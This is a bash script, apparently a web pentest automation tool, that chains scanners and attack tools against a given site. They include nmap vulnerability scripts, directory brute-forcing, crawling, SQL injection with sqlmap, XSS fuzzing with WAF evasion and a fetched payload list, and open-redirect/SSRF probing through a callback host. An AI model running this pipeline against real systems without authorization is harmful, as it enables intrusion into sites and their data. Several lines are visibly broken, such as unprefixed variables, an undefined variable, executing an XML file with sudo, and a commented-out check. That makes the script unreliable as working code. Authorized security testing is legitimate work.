#!/bin/bash

#Run:
#hunter-pto.sh "https://www.example.com" "https://collaborator.com" "Cookie:VALUE"

#Output:

#nmap.csv
#dirnfiles.txt
#retirejs.csv
#xsstrike.txt
#openredirect.csv
#sqlmap.csv
#dalfox.csv
#nuclei.csv
#testssl.csv
#nikto.csv
#zap.csv

sitio=$1
callback=$2

#nmap scan
echo ------------Init nmap------------
sudo nmap --top-ports 1000 --open --script vuln,default,banner,ftp-anon,ftp-bounce,ftp-syst,ssh-auth-methods,sshv1,telnet-ntlm-info,dns-cache-snoop,dns-recursion sitio -sSV -Pn -oX "./outputs/nmap.xml"

python3 ./tools/nmaptocsv/nmaptocsv.py -S -x "./outputs/nmap.xml" -o "./outputs/nmap.csv"

sudo "./outputs/nmap.xml"

#dirsearch
echo ------------Init dirsearch------------
dirsearch "$sitio" -w "TODO" -o "./outputs/dirnfiles.txt" --deep-recursive --force-recursive -e zip,bak,old,php,jsp,asp,aspx,txt,html,sql,js,log,xml,sh --format=csv -t 60

#spidering
cd outputs

echo "------------Init katana------------"
katana -o katana.txt -silent -js-crawl -u "$sitio"

echo "------------Init gau------------"
echo "$sitio" | gau --o  gau.txt

echo "------------Init hakrawler"
echo "$sitio" | hakrawler -subs | tee hakrawler.txt

echo ------------"Init paramspider------------"
python3 ../tools/ParamSpider/paramspider.py -q --domain "$sitio" -o paramspider.txt --level high --placeholder FUZZ
mv ./output/paramspider.txt ./paramspider.txt
rm -r output

#unificar resultados del spidering
cat katana.txt hakrawler.txt gau.txt paramspider.txt | tee spider.txt
sort spider.txt | uniq | tee spidering.txt
rm gau.txt
rm hakrawler.txt
rm katana.txt
rm paramspider.txt
rm spider.txt

#jsfinder
echo "--------------Init jsfinder------------"

folder=$(echo "$sitio" |  sed -r 's/https:\/\///g'  |  sed -r 's/http:\/\///g'  |  sed -r 's/HTTPS:\/\///g'  |  sed -r 's/HTTP:\/\///g')

mkdir "$folder"

echo "$sitio" | jsfinder -read -s -o ./"$sitio"/js-list.txt

cd "$folder"

while read line; do wget "$line"; done < ./js-list.txt

rm js-list.txt

echo "-----------Init retire-----------"
retire --outputformat json --outputpath ../retirejs.json

cd ..
rm -r ./"$folder"

python3 ../retire-converter.py
rm retirejs.json

# xsstrike
echo "------------Init xsstrike------------"
python3 ../tools/XSStrike/xsstrike.py -u "sitio" --crawl -l 3 --skip | tee xsstrike.txt

#creamos params
echo "------------Creating params------------"
cat "./spidering.txt" | grep "=" | sort | uniq  | qsreplace FUZZ | tee params.txt
echo "^$sitio" >> tmp_grep.txt
cat params.txt | grep -E -i "^$(paste -s -d "|" tmp_grep.txt)" | tee params.txt
rm tmp_grep.txt

#SSRF&y Open Redirect. Check the blind payload to test SSRF. Check the file openredirect.txt to check vuls.
echo "------------Init openredirec test------------"
echo "start,vulnerable,end" > openredirect.csv
cat params.txt | qsreplace $callback | sort | uniq | httpx -silent -status-code -location -json -fr | jq -r '. | .url + "," + .final_url' | awk -F, '{ #print $1==$2?$1 "," $2 ",SI": $1 "," $2 ",NO" }' | grep "SI" >> openredirect.csv

#SqlMap
echo "------------Init sqlmap------------"
sqlmap --banner --batch --level=1 --results-file=sqlmap.csv -m params.txt --ignore-redirects

#dalfox
echo "------------Init dalfox------------"
wget -nc https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Jhaddix.txt
echo "<script>alert(1)</script>" >> XSS-Jhaddix.txt
dalfox file params.txt --waf-evasion --output dalfox.json --format json --skip-mining-all --only-custom-payload --custom-payload ./XSS-Jhaddix.txt
rm XSS-Jhaddix.txt

python3 ../dalfox-converter.py
rm dalfox.json

#borramos params, ya no se usa
rm params.txt

#nuclei
echo "------------Init nuclei------------"
nuclei -u "$sitios" -j -o nuclei.json -t "$HOME/nuclei-templates"
python3 ../nuclei-converter.py
rm nuclei.json

#Testssl
echo "--------------Init testssl--------------"
testssl "$sitio" --csvfile testssl.csv

#Nikto
echo "--------------Init nikto--------------"
nikto -maxtime 15m -host "$sitio" -Format csv -output "./nikto.csv"

#ZAP
CSVHEADERS=1
touch zap-runner.sh

echo "echo \"--------------Init zap--------------\"" >> zap-runner.sh

#This can be run from WSL or a real Linux
if [[ $(cat /proc/version) == *"WSL"* ]]; then
    echo "docker.exe run -v \"$(wslpath -w .)\":/zap/wrk owasp/zap2docker-stable zap-baseline.py -t $sitio -s -j -T 10 -m 5 -a -J  zap.json" >> zap-runner.sh
else
    echo "docker run -v $(pwd):/zap/wrk owasp/zap2docker-stable zap-baseline.py -t $sitio -s -j -T 10 -m 5 -a -J zap.json"  >> zap-runner.sh
fi

if [ $CSVHEADERS -eq 1 ]; then
    echo "echo --------------Init CSV Zap"  >> zap-runner.sh
    echo "python3 ../zap-converter-init.py" >> zap-runner.sh
    CSVHEADERS=0
fi

echo "echo --------------Init Converter JSON To CSV--------------" >> zap-runner.sh
echo "python3 ../zap-converter.py" >> zap-runner.sh
echo "rm zap.json" >> zap-runner.sh		

sh zap-runner.sh
rm zap-runner.sh